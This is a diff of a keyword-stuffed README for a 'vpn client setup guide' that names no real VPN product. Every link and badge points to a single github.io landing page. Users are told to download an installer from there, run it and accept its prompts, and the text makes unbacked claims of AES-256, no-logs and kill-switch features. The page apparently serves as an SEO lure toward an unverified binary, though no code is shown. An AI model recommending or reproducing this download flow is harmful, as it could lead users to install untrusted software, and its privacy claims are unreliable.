@@ -1,93 +1,96 @@
 # ⚡ vpn client setup guide
 
-[![Download](https://img.shields.io/badge/Download-Get%20Installer-2ea44f?style=for-the-badge&logo=download)](https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20client-2ea44f?style=for-the-badge&logo=download)](https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/)
 [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-1f6feb?style=for-the-badge&logo=linux)](https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/)
-[![License](https://img.shields.io/badge/License-MIT-6f42c1?style=for-the-badge&logo=open-source-initiative)](https://github.com/fastvpnmyjob2026-prog/vpn-client-setup-guide-seo)
+[![License](https://img.shields.io/badge/License-MIT-6e40c9?style=for-the-badge&logo=open-source-initiative)](https://github.com/fastvpnmyjob2026-prog/vpn-client-setup-guide-seo)
 
 ## About
 
-This **vpn client setup guide** is a hands-on, no-nonsense walkthrough for installing and configuring a VPN client the way you actually use it: fast connect, stable connection, and a clean security baseline.
+This **vpn client setup guide** walks you through installing and configuring a VPN client fast, with the settings that actually matter: **AES-256 encryption**, **No-Logs policy**, **Kill Switch**, **Global Servers**, and a **privacy and security focus**.
 
-It focuses on the settings that matter: **AES-256 encryption**, **No-Logs policy**, **Kill Switch**, and selecting **Global Servers** for **high speed** without breaking everyday apps.  
-Repo: https://github.com/fastvpnmyjob2026-prog/vpn-client-setup-guide-seo
+This repo is the documentation and companion materials for the setup flow. Repo source:
+- https://github.com/fastvpnmyjob2026-prog/vpn-client-setup-guide-seo
+
+Main landing page (downloads + quick start):
+- https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/
 
 ## Features
 
-- **Fast start, fewer clicks**: install → sign in → connect
-- **AES-256 encryption**: keep traffic locked down on untrusted networks
-- **No-Logs policy**: privacy and security focus by default
-- **Kill Switch**: stop leaks if the tunnel drops
-- **Global Servers**: choose nearby for latency, or switch regions for access needs
-- **High speed + stable connection**: practical defaults that don’t fight your OS
-- **Clear checks**: confirm you’re tunneled and not leaking basics
+- **Quick client install** on Windows, macOS, and Linux
+- **AES-256 encryption** (verify it’s enabled in settings)
+- **No-Logs policy** (what to look for and what to avoid)
+- **Kill Switch** setup (prevents traffic leaks if the tunnel drops)
+- **Global Servers** selection tips (latency vs. location)
+- **High speed** tuning basics (protocol choice, server distance, DNS)
+- **Stable connection** checklist (reconnect behavior, sleep/wake handling)
 
 ## System Requirements
 
-| Item | Minimum |
+| Item | Requirement |
 |---|---|
 | Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 12+ |
-| Linux | Ubuntu 20.04+/Debian 11+ (or equivalent) |
-| RAM | 2 GB (4 GB recommended) |
+| Linux | Ubuntu/Debian/Fedora (64-bit) |
+| RAM | 2 GB minimum (4 GB recommended) |
 | Storage | 200 MB free |
-| Internet | Any stable connection (wired or Wi‑Fi) |
+| Internet | Any stable connection; broadband recommended |
 
 ## Installation
 
-> All downloads and install packages are linked from the landing page.
+> Use the landing page package so you get the latest build and the matching config files.
 
 ### Windows
 1. Download the installer from: https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/
-2. Run the `.exe` and approve the prompt.
-3. Open the VPN client → sign in.
-4. Enable **Kill Switch** in Settings before your first connection.
-5. Connect to a nearby **Global Server** for best speed.
+2. Run the installer → accept prompts.
+3. Open the VPN client → sign in / import config.
+4. Enable **Kill Switch** (Settings → Security).
+5. Connect to a nearby **Global Servers** location for best **High speed**.
 
 ### macOS
-1. Download the `.dmg` from: https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/
-2. Drag the app into **Applications**.
-3. Launch it → allow requested VPN permissions when prompted.
-4. Turn on **Kill Switch**.
-5. Connect and verify your traffic is routed through the VPN.
+1. Download the macOS package from: https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/
+2. Install the app (drag to Applications if provided as a .dmg).
+3. Launch the client → allow the VPN configuration prompt.
+4. Enable **Kill Switch**.
+5. Connect and confirm the status shows encrypted tunnel (AES-256).
 
 ### Linux
-1. Get the Linux package from: https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/
-2. Install using your distro’s package tool (per the package type provided).
-3. Launch the client (or start the service if provided).
-4. Enable **Kill Switch** and set the default protocol options.
-5. Connect to the closest **Global Server** and confirm the tunnel is active.
+1. Download the Linux build from: https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/
+2. Install using your distro method (deb/rpm/AppImage as provided).
+3. Start the client → sign in / import config.
+4. Turn on **Kill Switch**.
+5. Pick a server based on latency (closest region first).
 
 ## Comparison
 
 | Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
-| This setup (recommended defaults) | High speed | ✅ | ✅ | ✅ | ✅ |
-| Basic install (no tuning) | Medium | ✅ | ✅ | ❌ | ✅ |
-| DIY/manual tunnel only | Varies | ✅ | Varies | ❌ | ❌ |
+| This setup (recommended) | High speed | ✅ | ✅ | ✅ | ✅ |
+| Basic VPN defaults | Medium | ✅ | ❓ | ❓ | ✅ |
+| DIY tunnel scripts | Varies | ❓ | ❓ | ❓ | ❌ |
 
 ## FAQ
 
-**1) What should I enable first after install?**  
-Enable **Kill Switch** first, then connect. It prevents traffic from spilling out if the VPN drops.
+**Q: How do I know the Kill Switch is actually working?**  
+A: Enable it, connect, then force-disconnect the VPN (quit the client or drop the interface). You should lose internet until the tunnel is back.
 
-**2) Will this hurt my connection speed?**  
-Any VPN adds overhead, but picking a nearby **Global Server** and sticking to the default performance profile keeps things **high speed** in normal use.
+**Q: Will this help with speed?**  
+A: Yes—server choice and protocol settings matter. Start with the closest Global Servers region and switch only if you need a specific location.
 
-**3) How do I know it’s actually working?**  
-Connect, then confirm your public IP changes and your connection stays stable across sleep/wake and network switches.
+**Q: Does this include a No-Logs policy?**  
+A: The guide covers what “No-Logs policy” should look like and where to confirm it in the client/provider account pages.
 
-**4) Does this support privacy-focused usage?**  
-Yes—use **AES-256 encryption**, **No-Logs policy**, and keep **Kill Switch** on. That’s the baseline.
+**Q: Windows/macOS/Linux steps look similar—what’s the main difference?**  
+A: Permissions and network prompts. macOS asks for VPN configuration approval; Linux varies by package format and service management.
 
 ## Download
 
-Get the VPN client and follow the vpn client setup guide here:  
+Get the VPN client and the matching setup flow here:  
 **https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/**
 
 ## Final CTA
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-2ea44f?style=for-the-badge&logo=download)](https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/)
-[![Open Landing](https://img.shields.io/badge/Open-Landing%20Page-1f6feb?style=for-the-badge&logo=githubpages)](https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/)
-[![View Repo](https://img.shields.io/badge/View-Repository-6f42c1?style=for-the-badge&logo=github)](https://github.com/fastvpnmyjob2026-prog/vpn-client-setup-guide-seo)
+[![Get Started](https://img.shields.io/badge/Get%20Started-Open%20Setup%20Page-2ea44f?style=for-the-badge&logo=rocket)](https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Build-1f6feb?style=for-the-badge&logo=cloud-download)](https://fastvpnmyjob2026-prog.github.io/vpn-client-setup-guide-landing/)
+[![Repo](https://img.shields.io/badge/Repo-View%20Source-6e40c9?style=for-the-badge&logo=github)](https://github.com/fastvpnmyjob2026-prog/vpn-client-setup-guide-seo)
 
-*Keep your tunnel on, keep your leaks off.*
+*If you care about privacy and security focus, don’t guess—install clean, enable Kill Switch, and connect with AES-256 on from the first run.*
